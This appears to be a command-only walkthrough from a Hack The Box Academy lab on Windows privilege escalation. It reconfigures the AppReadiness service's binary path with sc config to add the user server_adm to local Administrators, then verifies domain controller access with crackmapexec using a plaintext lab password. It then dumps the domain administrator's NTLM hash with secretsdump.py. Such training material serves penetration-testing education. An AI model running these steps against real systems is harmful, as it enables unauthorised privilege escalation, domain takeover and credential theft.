#### Querying the AppReadiness Service

```cmd
C:\htb> sc qc AppReadiness
```
#### Checking Service Permissions with PsService

```cmd
C:\htb> c:\Tools\PsService.exe security AppReadiness
```
#### Checking Local Admin Group Membership

```cmd
C:\htb> net localgroup Administrators
```
#### Modifying the Service Binary Path

```cmd
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add" 

[SC] ChangeServiceConfig SUCCESS
```
#### Starting the Service

```cmd
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
#### Confirming Local Admin Group Membership

```cmd
C:\htb> net localgroup Administrators
```
![](Screenshot%202026-08-19%20at%2014.45.57.png)
#### Confirming Local Admin Access on Domain Controller

```shell
3kjS@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```
#### Retrieving NTLM Password Hashes from the Domain Controller

```shell
3kjS@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
